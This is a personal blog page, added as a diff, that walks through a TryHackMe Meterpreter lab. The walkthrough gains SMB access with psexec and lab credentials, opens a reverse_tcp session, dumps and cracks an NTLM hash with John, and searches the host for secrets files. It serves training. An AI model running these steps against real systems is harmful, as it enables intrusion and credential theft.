@@ -1,0 +1,352 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto" data-theme="auto">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>Metasploit: Meterpreter | Jenn Shagrin</title>
+<meta name="description" content="TryHackMe — Post-exploitation with Meterpreter. Session management, architecture mismatch debugging, hashdump, NTLM cracking, and targeted file discovery.">
+<meta name="author" content="">
+<link rel="canonical" href="https://jennshaggy.github.io/meterpreter.html">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.086cbe158e48a4a74f4fec1e99aa846e3b43c1f4abb8e972f3ad8921f1408291.css" rel="preload stylesheet" as="style">
+<link rel="icon" href="https://jennshaggy.github.io/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="https://jennshaggy.github.io/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://jennshaggy.github.io/favicon-32x32.png">
+<link rel="apple-touch-icon" href="https://jennshaggy.github.io/apple-touch-icon.png">
+<link rel="mask-icon" href="https://jennshaggy.github.io/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --code-block-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+                color-scheme: dark;
+            }
+            .list {
+                background: var(--theme);
+            }
+            .toc {
+                background: var(--entry);
+            }
+        }
+        @media (prefers-color-scheme: light) {
+            .list::-webkit-scrollbar-thumb {
+                border-color: var(--code-bg);
+            }
+        }
+    </style>
+</noscript>
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else if (localStorage.getItem("pref-theme") === "light") {
+       document.querySelector("html").dataset.theme = 'light';
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else {
+        document.querySelector("html").dataset.theme = 'light';
+    }
+</script>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="/assets/css/extended/harmonize.css">
+<meta property="og:url" content="https://jennshaggy.github.io/meterpreter.html">
+<meta property="og:site_name" content="Jenn Shagrin">
+<meta property="og:title" content="Metasploit: Meterpreter">
+<meta property="og:description" content="Post-exploitation with Meterpreter. Session management, architecture mismatch, hashdump, NTLM cracking, targeted file discovery.">
+<meta property="og:locale" content="en-us">
+<meta property="og:type" content="article">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Metasploit: Meterpreter">
+<meta name="twitter:description" content="Post-exploitation with Meterpreter. Session management, architecture mismatch, hashdump, NTLM cracking, targeted file discovery.">
+</head>
+
+<body id="top">
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="https://jennshaggy.github.io/" accesskey="h" title="Jenn Shagrin (Alt + H)">Jenn Shagrin</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="/security-defense/" title="Security &amp; Defense">
+                    <span>Security &amp; Defense</span>
+                </a>
+            </li>
+            <li>
+                <a href="/networking.html" title="Networking">
+                    <span>Networking</span>
+                </a>
+            </li>
+            <li>
+                <a href="/systems-foundation.html" title="Systems">
+                    <span>Systems</span>
+                </a>
+            </li>
+            <li>
+                <a href="/applied-projects.html" title="Penetration Testing">
+                    <span class="active">Penetration Testing</span>
+                </a>
+            </li>
+            <li>
+                <a href="/platforms-training.html" title="Training">
+                    <span>Training</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://iad.portfolio.instructure.com/shared/4c4c330d1376bf479a9cbb73190bad1a110fb33cf436c283" title="CIAT Portfolio" target="_blank" rel="noopener noreferrer">
+                    <span>CIAT Portfolio</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+
+<main class="main">
+<article class="post-single">
+  <header class="post-header">
+    <h1 class="post-title entry-hint-parent">Metasploit: Meterpreter</h1>
+    <div class="post-description">This room was less about exploitation difficulty and more about learning how to operate cleanly inside Metasploit once initial access already exists.</div>
+  </header>
+
+  <div class="post-content">
+
+<p>Target: <code>ACME-TEST</code>, domain <code>FLASH</code>, Windows Server 2019. Compromised over SMB with valid credentials using <code>exploit/windows/smb/psexec</code>. The rest of the room focused on Meterpreter as a post-exploitation interface.</p>
+
+<p>The most important lesson was not the individual commands — it was session awareness.</p>
+
+<hr>
+
+<h2>Initial Access</h2>
+
+<pre><code>msfconsole
+use exploit/windows/smb/psexec
+set RHOSTS 10.144.184.164
+set SMBUser ballen
+set SMBPass Password1
+set LHOST 192.168.128.19
+run</code></pre>
+
+<img src="/images/meterpreter/Screenshot 2026-03-26 at 8.07.32 AM.png" alt="msfconsole psexec module configured and running" style="max-width:100%;margin:1rem 0;">
+
+<img src="/images/meterpreter/Screenshot 2026-03-26 at 8.08.08 AM.png" alt="Meterpreter session opened" style="max-width:100%;margin:1rem 0;">
+
+<hr>
+
+<h2>Baseline Verification</h2>
+
+<pre><code>sysinfo
+getuid</code></pre>
+
+<p>Confirmed: hostname <code>ACME-TEST</code>, domain <code>FLASH</code>, privilege level <code>NT AUTHORITY\SYSTEM</code>.</p>
+
+<img src="/images/meterpreter/Screenshot 2026-03-26 at 8.08.58 AM.png" alt="sysinfo confirming ACME-TEST on FLASH domain" style="max-width:100%;margin:1rem 0;">
+
+<img src="/images/meterpreter/Screenshot 2026-03-26 at 8.09.48 AM.png" alt="getuid confirming NT AUTHORITY\SYSTEM" style="max-width:100%;margin:1rem 0;">
+
+<hr>
+
+<h2>The Architecture Mismatch Problem</h2>
+
+<p>Initial <code>hashdump</code> attempts failed with <code>Incorrect function</code> — even from a SYSTEM Meterpreter session. The issue wasn't syntax. It was session selection.</p>
+
+<pre><code>sessions</code></pre>
+
+<p>Multiple sessions were open, including both x86 and x64 Meterpreter sessions. Running <code>hashdump</code> from an x86 session against a 64-bit Windows target fails. The fix:</p>
+
+<pre><code>set payload windows/x64/meterpreter/reverse_tcp
+run
+sessions -i 2</code></pre>
+
+<img src="/images/meterpreter/Screenshot 2026-03-26 at 8.47.35 AM.png" alt="sessions listing showing x86 and x64 Meterpreter sessions" style="max-width:100%;margin:1rem 0;">
+
+<img src="/images/meterpreter/Screenshot 2026-03-26 at 8.56.11 AM.png" alt="Switching to x64 session before hashdump" style="max-width:100%;margin:1rem 0;">
+
+<p>Before troubleshooting a command too deeply, verify which session is actually in use.</p>
+
+<hr>
+
+<h2>hashdump</h2>
+
+<p>From the correct x64 session:</p>
+
+<pre><code>hashdump</code></pre>
+
+<p>Relevant output:</p>
+
+<pre><code>jchambers:1114:aad3b435b51404eeaad3b435b51404ee:69596c7aa1e8daee17f8e78870e25a5c:::</code></pre>
+
+<p>NTLM hash for <code>jchambers</code>: <code>69596c7aa1e8daee17f8e78870e25a5c</code></p>
+
+<img src="/images/meterpreter/Screenshot 2026-03-26 at 8.22.00 AM.png" alt="hashdump output from x64 Meterpreter session" style="max-width:100%;margin:1rem 0;">
+
+<hr>
+
+<h2>Cracking the NTLM Hash</h2>
+
+<p>Used a second local terminal instead of trying to crack inside Meterpreter — keeps the session stable and the workflow clean.</p>
+
+<pre><code>echo '69596c7aa1e8daee17f8e78870e25a5c' > jchambers.hash
+john --format=NT jchambers.hash
+john --show --format=NT jchambers.hash</code></pre>
+
+<p>Recovered: <code>Trustno1</code></p>
+
+<img src="/images/meterpreter/Screenshot 2026-03-26 at 8.23.58 AM.png" alt="John cracking NTLM hash — Trustno1" style="max-width:100%;margin:1rem 0;">
+
+<hr>
+
+<h2>Post-Exploitation — File Discovery</h2>
+
+<p>Dropped into a Windows shell from Meterpreter:</p>
+
+<pre><code>shell
+net share</code></pre>
+
+<p>Identified user-created share: <code>speedster → C:\Shares\speedster</code></p>
+
+<p>Rather than crawling the entire filesystem recursively, used targeted search:</p>
+
+<pre><code>where /r C:\ secrets.txt</code></pre>
+
+<pre><code>C:\Program Files (x86)\Windows Multimedia Platform\secrets.txt</code></pre>
+
+<pre><code>type "C:\Program Files (x86)\Windows Multimedia Platform\secrets.txt"</code></pre>
+
+<pre><code>My Twitter password is KDSvbsw3849!</code></pre>
+
+<img src="/images/meterpreter/Screenshot 2026-03-26 at 9.03.19 AM.png" alt="where /r C:\ locating secrets.txt efficiently" style="max-width:100%;margin:1rem 0;">
+
+<img src="/images/meterpreter/Screenshot 2026-03-26 at 9.11.11 AM.png" alt="secrets.txt contents revealing Twitter password" style="max-width:100%;margin:1rem 0;">
+
+<pre><code>where /r C:\ realsecret.txt</code></pre>
+
+<pre><code>C:\inetpub\wwwroot\realsecret.txt</code></pre>
+
+<pre><code>The Flash is the fastest man alive</code></pre>
+
+<img src="/images/meterpreter/Screenshot 2026-03-26 at 9.24.11 AM.png" alt="where /r C:\ locating realsecret.txt" style="max-width:100%;margin:1rem 0;">
+
+<img src="/images/meterpreter/Screenshot 2026-03-26 at 9.28.15 AM.png" alt="realsecret.txt contents" style="max-width:100%;margin:1rem 0;">
+
+<hr>
+
+<h2>What This Room Was Actually About</h2>
+
+<p>Session architecture matters. The initial <code>hashdump</code> failures weren't a syntax problem — they were caused by running an x86 Meterpreter session against a 64-bit target. Checking active sessions and deliberately switching to the x64 one solved it immediately.</p>
+
+<p>Cracking NTLM hashes is cleaner as a separate local workflow. <code>where /r</code> is a much better file-location tool than recursively crawling large directories. This room was really about post-exploitation discipline: knowing where you are, what layer you're in, and which tool makes sense at each step.</p>
+
+  </div>
+  <footer class="post-footer"></footer>
+</article>
+</main>
+
+<footer class="footer">
+    <span>&copy; 2026 <a href="https://jennshaggy.github.io/">Jenn Shagrin</a></span> ·
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &amp;
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu');
+    if (menu) {
+        const scrollPosition = localStorage.getItem("menu-scroll-position");
+        if (scrollPosition) {
+            menu.scrollLeft = parseInt(scrollPosition, 10);
+        }
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({ behavior: "smooth" });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        const html = document.querySelector("html");
+        if (html.dataset.theme === "dark") {
+            html.dataset.theme = 'light';
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            html.dataset.theme = 'dark';
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+</script>
+</body>
+</html>
